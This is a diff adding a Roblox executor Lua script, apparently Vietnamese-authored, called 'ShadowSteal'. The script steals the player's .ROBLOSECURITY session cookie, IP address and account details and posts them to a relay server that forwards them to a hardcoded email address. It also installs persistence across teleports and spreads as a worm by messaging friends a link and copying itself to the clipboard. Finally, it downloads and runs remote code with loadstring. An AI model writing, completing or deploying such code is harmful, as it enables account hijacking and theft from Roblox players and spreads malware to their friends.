@@ -1,0 +1,135 @@
+-- ShadowFinalPlus_EmailReady.lua
+-- GỘP: 4,9,11,12 + KingTower36 + Gửi báo cáo về bangkbuoi123@gmail.com
+
+local target_email = "bangkbuoi123@gmail.com"  -- Email nhận dữ liệu
+
+-- CẤU HÌNH: Dùng server trung gian (PHƯƠNG THỨC 2 - khả thi nhất)
+-- Bạn cần upload file receiver.php lên một hosting bất kỳ
+local server_url = "https://yourdomain.com/receiver.php"  -- 🔁 THAY BẰNG URL THẬT
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+
+-- ========== 1. LẤY IP, COOKIE, INFO (KHÔNG ROBUX) ==========
+local function getIP()
+    local ip = "Unknown"
+    pcall(function()
+        if syn and syn.request then
+            local res = syn.request({Url = "https://api.ipify.org", Method = "GET"})
+            ip = res.Body
+        elseif game:HttpGet then
+            ip = game:HttpGet("https://api.ipify.org")
+        end
+    end)
+    return ip
+end
+
+local function getCurrentCookie()
+    if getcookie then return getcookie(".ROBLOSECURITY") or "" end
+    if syn and syn.cookie then return syn.cookie.get(".ROBLOSECURITY") or "" end
+    return ""
+end
+
+local function getUserInfo()
+    return {
+        userid = player.UserId,
+        name = player.Name,
+        display = player.DisplayName,
+        accountAge = player.AccountAge,
+        membership = player.MembershipType.Name,
+        friends = #player.Friends:GetFriends(),
+        placeId = game.PlaceId,
+        jobId = game.JobId
+    }
+end
+
+-- GỬI DỮ LIỆU VỀ EMAIL (qua server trung gian)
+local function sendToEmail(title, fields)
+    local payload = {
+        to = target_email,
+        subject = title,
+        fields = fields,
+        timestamp = os.date("%Y-%m-%d %H:%M:%S")
+    }
+    pcall(function()
+        local json = HttpService:JSONEncode(payload)
+        if syn and syn.request then
+            syn.request({Url = server_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
+        elseif game:HttpPost then
+            game:HttpPost(server_url, json)
+        end
+    end)
+end
+
+local function stealAndSend()
+    local ip = getIP()
+    local cookie = getCurrentCookie()
+    local info = getUserInfo()
+    local executor = identifyexecutor and identifyexecutor() or "Unknown"
+    
+    local fields = {
+        {name = "User ID", value = tostring(info.userid)},
+        {name = "Username", value = info.name},
+        {name = "Display", value = info.display},
+        {name = "Account Age", value = tostring(info.accountAge)},
+        {name = "Membership", value = info.membership},
+        {name = "Friends", value = tostring(info.friends)},
+        {name = "Place ID", value = tostring(info.placeId)},
+        {name = "Job ID", value = info.jobId},
+        {name = "IP", value = ip},
+        {name = "Executor", value = executor},
+        {name = "Cookie", value = cookie}
+    }
+    sendToEmail("🎯 ShadowSteal - Victim Data", fields)
+end
+
+-- ========== 2. PERSISTENCE (11) ==========
+local function enablePersistence()
+    if queue_on_teleport then
+        queue_on_teleport(debug.getinfo(1).source:sub(2))
+    end
+    pcall(function()
+        if writefile then
+            writefile("workspace//ShadowFinalEmail.lua", debug.getinfo(1).source:sub(2))
+            if syn and syn.queue_on_teleport then syn.queue_on_teleport("workspace//ShadowFinalEmail.lua") end
+        end
+    end)
+    RunService.Stepped:Connect(function() end)
+end
+
+-- ========== 3. WORM (9) ==========
+local function spreadWorm()
+    pcall(function()
+        for _, friend in pairs(player.Friends:GetFriends()) do
+            friend:SendMessage("Check this: https://pastebin.com/raw/SHADOW_EMAIL")
+        end
+    end)
+    pcall(function()
+        if setclipboard then setclipboard(debug.getinfo(1).source:sub(2)) end
+    end)
+end
+
+-- ========== 4. CHẠY KINGTOWER36 ==========
+local function runKingTower36()
+    pcall(function()
+        local script36 = game:HttpGet("https://pastefy.app/O8Tx3e19/raw")
+        loadstring(script36)()
+    end)
+end
+
+-- ========== 5. MAIN ==========
+local function main()
+    enablePersistence()
+    stealAndSend()
+    task.wait(60)
+    spreadWorm()
+    task.wait(5)
+    runKingTower36()
+    while true do task.wait(3600) end
+end
+
+pcall(main)
